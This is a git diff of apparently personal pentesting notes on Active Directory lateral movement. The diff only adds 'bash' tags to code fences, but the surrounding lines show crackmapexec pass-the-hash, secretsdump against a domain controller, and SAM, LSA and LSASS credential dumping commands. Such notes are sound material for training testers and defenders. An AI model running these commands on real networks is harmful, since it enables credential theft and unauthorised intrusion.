@@ -6,7 +6,7 @@ If we crack a password and/or can dump the SAM hashes, we can leverage both for 
 
 We will primarily use a tool called crackmapexec whose syntax will look something like this:
 
-```
+```bash
 crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
 ```
 
@@ -18,13 +18,13 @@ Lets say we have some hashes that we got from metasploit after running hashdump
 
  Or we can use a tool called secretsdump like so:
 
-```
+```bash
 secretsdump.py <DC>/<user>:<password> @ <ip_of_DC>
 ```
 
 We can then use crackmapexec to pass the hash as well by this command:
 
-```
+```bash
 crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
 ```
 
@@ -32,7 +32,7 @@ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
 
 We can additionally use crackmapexec to dump valuable data:
 
-```
+```bash
 crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam (or --shares, --lsa)
 ```
 
@@ -40,7 +40,7 @@ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam (or --shares, 
 
 It even has built in modules...
 
-```
+```bash
 crackmapexec smb -L
 ```
 
@@ -48,7 +48,7 @@ crackmapexec smb -L
 
 For example, we can dump the lsass with lsassy
 
-```
+```bash
 crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy
 ```
 
@@ -56,7 +56,7 @@ crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy
 
 There is also a database for crackmapexec which tells you how many attempts a user has made to login and stuff
 
-```
+```bash
 cmedb
 ```
 
